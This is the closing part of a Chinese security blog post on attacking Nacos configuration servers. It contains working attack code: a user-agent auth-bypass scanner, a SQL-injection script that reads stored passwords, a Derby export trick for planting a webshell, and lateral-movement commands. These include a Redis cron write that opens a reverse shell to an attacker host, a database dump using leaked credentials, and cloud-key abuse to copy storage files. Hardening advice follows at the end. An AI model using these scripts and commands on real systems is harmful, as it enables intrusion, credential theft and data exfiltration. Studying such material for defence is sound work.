+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">paths = [<span class="string">&quot;/nacos/v1/auth/users&quot;</span>, <span class="string">&quot;/nacos/v1/cs/configs&quot;</span>,</span><br><span class="line">         <span class="string">&quot;/nacos/v1/console/namespaces&quot;</span>]</span><br><span class="line">uas = [<span class="string">&quot;Nacos-Server&quot;</span>, <span class="string">&quot;Nacos-Client&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> paths:</span><br><span class="line">        <span class="keyword">for</span> ua <span class="keyword">in</span> uas:</span><br><span class="line">            r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;target&#125;</span>:8848<span class="subst">&#123;p&#125;</span>&quot;</span>,</span><br><span class="line">                             headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: ua&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pageItems&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;target&#125;</span><span class="subst">&#123;p&#125;</span>  bypassed with UA: <span class="subst">&#123;ua&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、Nacos-RCE-via-Derby"><a href="#六、Nacos-RCE-via-Derby" class="headerlink" title="六、Nacos RCE via Derby"></a>六、Nacos RCE via Derby</h2><p>Nacos standalone 模式使用内置 Apache Derby 数据库，Derby 在历史版本中暴露出 SQL 注入漏洞，可进一步利用实现远程代码执行。</p>
+<h3 id="Derby-SQL-注入"><a href="#Derby-SQL-注入" class="headerlink" title="Derby SQL 注入"></a>Derby SQL 注入</h3><p>部分配置查询接口直接拼接用户参数到 SQL 语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 枚举 Derby 所有表</span></span><br><span class="line"><span class="keyword">SELECT</span> tablename <span class="keyword">FROM</span> sys.systables <span class="keyword">WHERE</span> tabletype <span class="operator">=</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取用户密码</span></span><br><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-Derby-内置过程写文件实现-RCE"><a href="#利用-Derby-内置过程写文件实现-RCE" class="headerlink" title="利用 Derby 内置过程写文件实现 RCE"></a>利用 Derby 内置过程写文件实现 RCE</h3><p>Derby 允许注册 Java 函数并在 SQL 中调用，攻击者可以通过注入点创建恶意函数执行系统命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用 SYSCS_UTIL 写文件到 Web 目录</span></span><br><span class="line"><span class="keyword">CALL</span> SYSCS_UTIL.SYSCS_EXPORT_QUERY(</span><br><span class="line">  <span class="string">&#x27;SELECT * FROM users&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;/tmp/shell.jsp&#x27;</span>,</span><br><span class="line">  <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">&#x27;UTF-8&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>若 Nacos 部署在 Tomcat 等容器中，可将 Webshell 写入 webapps 目录实现 RCE。</p>
+<h3 id="综合攻击脚本"><a href="#综合攻击脚本" class="headerlink" title="综合攻击脚本"></a>综合攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, urllib.parse</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://192.168.1.100:8848&quot;</span></span><br><span class="line">HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Nacos-Server&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqli</span>(<span class="params">sql</span>):</span><br><span class="line">    payload = <span class="string">f&quot;test&#x27; OR 1=1; <span class="subst">&#123;sql&#125;</span> --&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/nacos/v1/cs/configs?dataId=<span class="subst">&#123;urllib.parse.quote(payload)&#125;</span>&amp;group=DEFAULT_GROUP&quot;</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url, headers=HEADERS).text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 Derby 版本</span></span><br><span class="line"><span class="built_in">print</span>(sqli(<span class="string">&quot;SELECT getdatabaseversion() FROM sysibm.sysdummy1&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举表名</span></span><br><span class="line"><span class="built_in">print</span>(sqli(<span class="string">&quot;SELECT tablename FROM sys.systables WHERE tabletype=&#x27;T&#x27;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户密码</span></span><br><span class="line"><span class="built_in">print</span>(sqli(<span class="string">&quot;SELECT username, password FROM users&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、配置泄漏后的横向移动"><a href="#七、配置泄漏后的横向移动" class="headerlink" title="七、配置泄漏后的横向移动"></a>七、配置泄漏后的横向移动</h2><p>获取配置中的凭据后，常见的横向移动路径如下。</p>
+<p><strong>数据库直连</strong>：Nacos 配置中常见如下内容：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://10.0.1.5:3306/prod_db</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">P@ssw0rd2024</span></span><br></pre></td></tr></table></figure>
+
+<p>利用提取的凭据直连数据库导出业务数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.0.1.5 -u root -p<span class="string">&#x27;P@ssw0rd2024&#x27;</span> -e <span class="string">&quot;SELECT * FROM users LIMIT 10&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Redis GetShell</strong>：若配置中泄漏 Redis 密码，可写入计划任务反弹 Shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.0.1.6 -a <span class="string">&#x27;redis_pass&#x27;</span></span><br><span class="line">&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">&gt; <span class="built_in">set</span> x <span class="string">&quot;\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1\n&quot;</span></span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><strong>云 AK&#x2F;SK 滥用</strong>：提取到阿里云等 AK&#x2F;SK 后可操作云资源：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aliyun configure <span class="built_in">set</span> --access-key-id LTAI5txxxxxxxx \</span><br><span class="line">                     --access-key-secret xxxxxxxxxxxxxxxx</span><br><span class="line">aliyun oss <span class="built_in">ls</span></span><br><span class="line">aliyun oss <span class="built_in">cp</span> oss://bucket-name/sensitive_file ./</span><br></pre></td></tr></table></figure>
+
+<p><strong>内网服务枚举</strong>：通过 Nacos 服务列表获取内网拓扑：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://target:8848/nacos/v1/ns/service/list?pageNo=1&amp;pageSize=1000&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回的 IP、端口、健康状态信息可作为下一阶段内网渗透的靶标。</p>
+<h2 id="八、安全加固建议"><a href="#八、安全加固建议" class="headerlink" title="八、安全加固建议"></a>八、安全加固建议</h2><ol>
+<li><strong>升级版本</strong>：升级至 Nacos 2.3.0 及以上，新版本认证机制有大幅改进。</li>
+<li><strong>修改默认凭证</strong>：部署后立即修改 nacos&#x2F;nacos 默认密码。</li>
+<li><strong>开启认证</strong>：在 <code>application.properties</code> 中配置：<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nacos.core.auth.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">nacos.core.auth.server.identity.key</span>=<span class="string">自定义Key</span></span><br><span class="line"><span class="attr">nacos.core.auth.server.identity.value</span>=<span class="string">自定义Value</span></span><br><span class="line"><span class="attr">nacos.core.auth.plugin.nacos.token.secret.key</span>=<span class="string">随机Base64字符串</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>网络隔离</strong>：8848 端口绑定内网 IP，禁止公网暴露，前端部署 WAF。</li>
+<li><strong>最小权限</strong>：Nacos 所用数据库账户配置最小权限，并在网络层做访问控制。</li>
+<li><strong>日志审计</strong>：开启访问日志并接入 SIEM，监控异常的配置读取行为。</li>
+<li><strong>敏感数据加密</strong>：配置中的敏感字段使用加密存储或外部密钥管理服务（如 Vault）。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Nacos 作为微服务架构的核心组件，其安全性直接影响整个业务体系。本文梳理了从信息探测到权限提升的完整攻击面，涵盖了默认凭证、未授权访问、CVE-2021-29441 绕过、Derby RCE 以及配置泄漏后的横向移动路径。攻防实践中 Nacos 常被作为突破内网的跳板，安全人员应在日常巡检中将 Nacos 列为必检项，开发团队应严格遵循加固建议，降低被入侵风险。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>Nacos 官方文档：<a target="_blank" rel="noopener" href="https://nacos.io/docs/latest/">https://nacos.io/docs/latest/</a></li>
+<li>Nacos GitHub：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></li>
+<li>CVE-2021-29441：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-29441">https://nvd.nist.gov/vuln/detail/CVE-2021-29441</a></li>
+<li>Apache Derby 文档：<a target="_blank" rel="noopener" href="https://db.apache.org/derby/">https://db.apache.org/derby/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag"># 云安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Deserialization-php-basics/" rel="prev" title="PHP反序列化基础">
+                  <i class="fa fa-angle-left"></i> PHP反序列化基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Deserialization-php-phar/" rel="next" title="PHP Phar反序列化">
+                  PHP Phar反序列化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
